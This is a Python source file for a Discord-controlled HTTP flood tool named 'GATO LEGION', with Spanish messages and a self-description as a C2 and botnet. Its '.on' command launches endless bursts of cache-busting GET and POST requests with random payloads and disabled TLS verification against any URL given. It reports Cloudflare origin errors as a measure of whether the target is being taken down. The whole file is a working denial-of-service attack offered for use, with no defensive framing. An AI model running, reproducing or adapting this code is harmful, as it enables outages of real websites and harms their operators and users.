import subprocess
import sys
import os
import time

# --- INSTALADOR AUTOMÁTICO INTEGRADO ---
def install_and_clear():
    required = ["aiohttp", "discord.py", "colorama"]
    os.system('cls' if os.name == 'nt' else 'clear')
    print("🛠️ Verificando entorno de combate...")
    for lib in required:
        try:
            __import__(lib)
        except ImportError:
            print(f"📦 Instalando: {lib}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", lib, "--quiet"])
    time.sleep(1)

install_and_clear()

import asyncio, aiohttp, ssl, random, discord
from discord.ext import commands
from colorama import Fore, init

init(autoreset=True)

# --- CONFIGURACIÓN DINÁMICA ---
os.system('cls' if os.name == 'nt' else 'clear')
print(f"{Fore.CYAN}🐱 GATO LEGION V24.2 | SELF-INSTALLER & AUTO-CONFIG")
print(f"{Fore.YELLOW}--------------------------------------------------")
TOKEN_INPUT = input(f"{Fore.WHITE}👉 Pon el token de tu bot: ").strip()

HILOS_POR_RAFAGA = 1100
MENSAJES = ["C2Pmiv", "SectaEscaloner", "C2", "Botnet"]
stats = {"hits": 0, "525": 0, "522": 0, "active": False, "target": ""}

class GatoC2(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix=".", intents=intents)

    async def on_ready(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"{Fore.GREEN}✅ REQUISITOS LISTOS")
        print(f"{Fore.CYAN}👑 C2 ONLINE: {self.user}")
        print(f"{Fore.MAGENTA}Utiliza .on [url] en Discord para iniciar el asalto")

    async def attack_engine(self):
        while stats["active"]:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.set_ciphers('ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-GCM-SHA384')
            
            conn = aiohttp.TCPConnector(ssl=ctx, limit=0, ttl_dns_cache=300)
            async with aiohttp.ClientSession(connector=conn) as session:
                while stats["active"]:
                    tasks = [self.fire_payload(session) for _ in range(150)] # Ráfagas pesadas
                    await asyncio.gather(*tasks)
                    await asyncio.sleep(0.001)

    async def fire_payload(self, session):
        msg = random.choice(MENSAJES)
        headers = {
            "User-Agent": f"GatoLegion/24.2 (Windows; {msg}; {random.getrandbits(16)})",
            "Cache-Control": "no-cache, no-store, must-revalidate",
            "X-Signature": msg,
            "Connection": "keep-alive"
        }
        url = f"{stats['target']}?nocache={random.getrandbits(64)}&v={time.time()}"
        
        try:
            if random.random() > 0.4:
                async with session.post(url, headers=headers, data={"shred": os.urandom(2048).hex()}, timeout=5) as r:
                    pass
            else:
                async with session.get(url, headers=headers, timeout=5) as r:
                    pass
            
            stats["hits"] += 1
            if r.status == 525: stats["525"] += 1
            elif r.status in [522, 524]: stats["522"] += 1
        except:
            stats["522"] += 1

bot = GatoC2()

@bot.command()
async def on(ctx, url):
    if stats["active"]:
        return await ctx.send("⚠️ Ya hay una operación en curso.")
    
    stats["target"] = url if url.startswith("http") else f"https://{url}"
    stats["active"] = True
    stats["hits"], stats["525"], stats["522"] = 0, 0, 0
    
    embed = discord.Embed(title="🐱 ASALTO COORDINADO INICIADO", color=0xff0000)
    embed.add_field(name="🎯 OBJETIVO", value=f"`{stats['target']}`", inline=False)
    embed.add_field(name="🔋 MODO", value="`SSL/TLS Spam + POST Flood`", inline=True)
    embed.set_footer(text="Logs reales actualizándose cada 60s...")
    
    msg_update = await ctx.send(embed=embed)
    asyncio.create_task(bot.attack_engine())
    
    while stats["active"]:
        await asyncio.sleep(60)
        if not stats["active"]: break
        
        new_embed = discord.Embed(title="📊 ESTADO DEL ORIGEN (C2)", color=0x00ff00)
        new_embed.add_field(name="🔥 Errores 525", value=f"`{stats['525']}`", inline=True)
        new_embed.add_field(name="⏳ Errores 522/502", value=f"`{stats['522']}`", inline=True)
        new_embed.add_field(name="🚀 Hits Totales", value=f"`{stats['hits']}`", inline=False)
        try: await msg_update.edit(embed=new_embed)
        except: break

@bot.command()
async def off(ctx):
    stats["active"] = False
    await ctx.send("🛑 **Saturación finalizada.**")

if __name__ == "__main__":
    try:
        bot.run(TOKEN_INPUT)
    except Exception as e:
        print(f"{Fore.RED}❌ Error al conectar el bot: {e}")
                    
